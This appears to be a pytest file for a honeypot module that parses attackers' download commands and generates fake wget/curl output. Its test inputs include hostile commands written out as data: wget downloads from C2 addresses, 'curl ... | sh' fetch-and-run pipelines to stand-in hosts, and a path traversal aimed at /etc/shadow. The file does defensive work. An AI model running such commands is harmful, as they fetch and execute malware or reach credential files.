"""Parsing what an attacker asked to retrieve.

The URL in a dropper's first command is the most valuable single field a
honeypot can record: it names the C2, it is usually live at the moment of
capture, and it is what a takedown request needs. Every shape below is one
seen in real loader scripts.
"""

from honeypot.core import dropper


class TestParse:
    def test_plain_wget(self):
        d = dropper.parse("wget http://185.220.101.5/bins/mips")
        assert d.tool == "wget"
        assert d.url == "http://185.220.101.5/bins/mips"
        assert d.host == "185.220.101.5"
        assert d.filename == "mips"
        assert d.saves is True

    def test_output_flag_sets_the_destination(self):
        d = dropper.parse("wget http://1.2.3.4/a -O /tmp/payload")
        assert d.target == "/tmp/payload"
        assert d.filename == "payload"

    def test_attached_output_flag(self):
        d = dropper.parse("wget -O/tmp/x http://1.2.3.4/a")
        assert d.target == "/tmp/x"

    def test_pipeline_to_shell_is_recognised(self):
        d = dropper.parse("curl -s http://evil.tld/i.sh | sh")
        assert d.piped is True
        # Nothing lands on disk when the content goes straight to a shell.
        assert d.saves is False

    def test_curl_save_flag(self):
        d = dropper.parse("curl -sO http://evil.tld/loader")
        assert d.saves is True
        assert d.filename == "loader"

    def test_stdout_flag_does_not_save(self):
        assert dropper.parse("wget -O- http://x.y/z").saves is False

    def test_scheme_is_assumed_when_omitted(self):
        d = dropper.parse("wget 185.220.101.5/x")
        assert d.url.startswith("http://")
        assert d.host == "185.220.101.5"

    def test_port_is_carried(self):
        assert dropper.parse("wget http://c2.tld:8080/a").port == 8080

    def test_https_defaults_to_443(self):
        assert dropper.parse("wget https://c2.tld/a").port == 443

    def test_url_with_no_path_gets_a_filename(self):
        assert dropper.parse("wget http://c2.tld").filename == "index.html"

    def test_a_traversal_in_the_output_name_cannot_escape(self):
        """The filename is echoed back into the transcript, so it is a basename."""
        d = dropper.parse("wget http://c2.tld/../../etc/shadow")
        assert "/" not in d.filename

    def test_non_fetch_commands_are_not_claimed(self):
        assert dropper.parse("ls -la") is None
        assert dropper.parse("wget") is None
        assert dropper.parse("") is None


class TestTranscript:
    def test_an_ip_literal_is_not_resolved(self):
        """wget prints no Resolving line for an address. Getting this wrong is
        a free tell for anyone who has read real wget output."""
        text = dropper.transcript(dropper.parse("wget http://1.2.3.4/a"), 4096)
        assert "Resolving" not in text
        assert "Connecting to 1.2.3.4:80... connected." in text

    def test_a_hostname_is_resolved(self):
        text = dropper.transcript(dropper.parse("wget http://c2.tld/a"), 4096)
        assert "Resolving c2.tld" in text

    def test_the_saved_name_appears(self):
        text = dropper.transcript(dropper.parse("wget http://c2.tld/loader"), 4096)
        assert "'loader' saved" in text

    def test_curl_is_silent_when_streaming(self):
        assert dropper.transcript(dropper.parse("curl http://c2.tld/a | sh"), 900) == ""
